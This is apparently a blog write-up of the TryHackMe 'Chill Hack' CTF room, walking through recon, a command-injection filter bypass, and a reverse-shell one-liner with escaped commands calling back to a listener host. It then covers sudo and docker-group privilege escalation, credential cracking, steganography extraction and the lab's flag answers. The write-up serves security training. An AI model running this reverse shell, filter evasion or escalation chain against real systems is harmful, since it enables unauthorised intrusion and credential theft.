---
layout: post
title: Chill Hack
date: 2023-03-27 12:00 +0700
categories: [THM, easy]
---

### Introduction

[Chill Hack] is an easy CTF on TryHackMe. This room provides, real world challenge, finding a command injection vulnerability in a web server and exploit the vulnerability to get a shell on the machine.

![chillhack](https://tryhackme-images.s3.amazonaws.com/room-icons/897a124df0a70ad86502193b83f46658.png)



---

Let's start scanning the machine with nmap.

```sh
nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
```

We can see there are 3 open ports, FTP, SSH and HTTP.

![Scan](/images/THM/chillhack/Captura.PNG)

We will try to connect to FTP with **anonymous** user.

```sh
ftp <IP>
dir
get note.txt
```

Once we are connected, if we view the content there is, we will see a **note**.

![ftp](/images/THM/chillhack/Captura1.PNG)

Talk about some command filter somewhere.

```sh
cat note.txt
```

![cat note](/images/THM/chillhack/Captura2.PNG)

Time to see the Web Page.

If we look a little here and a little there, we don't see anything interesting.

![web](/images/THM/chillhack/Captura3.PNG)

So it will be time to scan the web page in search of hidden files and directories.

```sh
gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt -q -t 40 -x html,php,txt
```

![webscan](/images/THM/chillhack/webs.PNG)

We found some interesting, a hidden directory called **secret**.

Looking around a bit, it seems, here is the command execution that Apaar was talking about in the note.

![web secet](/images/THM/chillhack/Captura4.PNG)

Let's try to see what directory we are in.

```sh
pwd
```

![pwd](/images/THM/chillhack/Captura5.PNG)

Now time to list all the content in the directory.

```sh
ls
```

Oh, this is what I was talking about in the note, apparently there is some kind of filter for some commands.

![ls](/images/THM/chillhack/Captura6.PNG)

```sh
nl /etc/passwd
```

![nl](/images/THM/chillhack/Captura7.PNG)

```sh
dir
```

![dir](/images/THM/chillhack/Captura8.PNG)

Playing around a bit, we can see that with the command **dir** and **nl** we can pass the filter, so let's try to see the code to know how it filters it.

```sh
nl index.php
```
Looking at the filter, it's not a very complicated filter to bypass, so what we'll do is add a **["\\"]** because is an escape character in the shell syntax.

![index code](/images/THM/chillhack/Captura9.PNG)

Let's get a reverse shell, remembering to add in the filtered commands, the backslash.

```sh
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|n\c 10.18.37.87 4444 >/tmp/f
```


![revshell](/images/THM/chillhack/Captura10.PNG)

We prepare the listener.

```sh
nc -lvnp 4444
```

Ya estamos dentro!

![connection](/images/THM/chillhack/Captura11.PNG)

If we move a little, through the subfolders in **/var/www**, we can find an **index.php**, in which we find some credentials for the database.

```sh
cd ../..
cd files
cat index.php
```

![index cat](/images/THM/chillhack/Captura12.PNG)

We can see that there are 3 users in the system.

And that we can access the directory of the user **apaar**.

```sh
cd /home
ls -la
```

![homes](/images/THM/chillhack/Captura13.PNG)

If we go inside and look, we can see a file **.helpline.sh** which looks suspicious.

```sh
cd apaar
ls -la
```

![file sh](/images/THM/chillhack/Captura14.PNG)

Let's see what sudo permissions we have.

```sh
sudo -l
```

![sudo -l](/images/THM/chillhack/Captura15.PNG)

We are going to take advantage of the fact that we can execute the script as apaar to elevate our privileges.

```sh
sudo -u apaar /home/apaar/.helpline.#!/bin/sh
/bin/bash
/bin/bash
id
```

![appar elevation](/images/THM/chillhack/Captura16.PNG)

We will upgrade our shell to an interactive one.

```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![interactive shell](/images/THM/chillhack/Captura17.PNG)

Now we can view the first flag!

```sh
cat local.txt
```

![user flag](/images/THM/chillhack/Captura18.PNG)

- User Flag
>Answer: {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

Time to connect to the mysql database, and look what we get.

```sh
mysql -u root -p
```

![mysql](/images/THM/chillhack/Captura19.PNG)

We can see that there is a database named **web portal** which contains credentials in the **users** table.

```sh
show databases;
use webportal;
show tables;
```

![databases](/images/THM/chillhack/Captura20.PNG)

```sh
Select * from users;
```

![select](/images/THM/chillhack/Captura21.PNG)

Let's try to crack those passwords.

```sh
john --format='dynamic=md5($p)' --wordlists=/usr/share/wordlists/rockyou.txt <file>
```

Once cracked and trying to connect via ssh, we got nothing, so the database seems to be a rabbit hole.

So we will generate a public key, to be able to connect with the user apaar via ssh.

![john crack](/images/THM/chillhack/Captura22.PNG)

Going back to **files** directory, we can see there is a file called **hacker.php**.

```sh
cat hacker.php
```

There is some text that tells us about looking in the dark. We will try to download the image that is there and see if it contains anything interesting.

![hacker php show](/images/THM/chillhack/Captura23.PNG)

```sh
python3 -m http.server
```

![python server](/images/THM/chillhack/Captura24.PNG)

We try extracting with **steghide** to see if we get lucky and extract something interesting from the image.

```sh
steghide extract -sf hacker-with-laptotp_23-2147985341.jpg
```

We got a zip!

![extract](/images/THM/chillhack/Captura25.PNG)

But the zip file seems to have a password. We will use **zip2johh** to crack the password and get the contents of the zip.

```sh
zip2john backup.zip > <output file name>
```

![zip2john](/images/THM/chillhack/Captura26.PNG)

We have the password, now it's time to see what the zip contains.

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt <output fle name>
```

![john zip](/images/THM/chillhack/Captura27.PNG)

We can see that there is a password encoded in base64 and that it is for the user **Anurodh**.

![zip content](/images/THM/chillhack/Captura28.PNG)

Let's decode it!

```sh
echo '<password>' | base64 -d
```

![echo](/images/THM/chillhack/Captura29.PNG)

And now it's time to connect!

```sh
ssh anurodh@<IP>
```

![ssh anurodh](/images/THM/chillhack/Captura30.PNG)

If we look at the groups that the user belongs to, we can see that he belongs to the **docker** group.

```sh
groups
```

![groups](/images/THM/chillhack/Captura31.PNG)

We can take advantage of this to get a root shell.

We can see how to do this in [GTFO].

```sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![elevate privileges](/images/THM/chillhack/Captura32.PNG)

Now that we are root, we can see the last flag.

```sh
cd /root
cat proof.txt
```

And with this we will have completed the machine!

![root flag](/images/THM/chillhack/Captura33.PNG)

- Root Flag
>Answer: {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

 [Chill Hack]: https://tryhackme.com/room/chillhack
 [GTFO]:https://gtfobins.github.io/gtfobins/docker/
 ["\\"]:https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_02_01
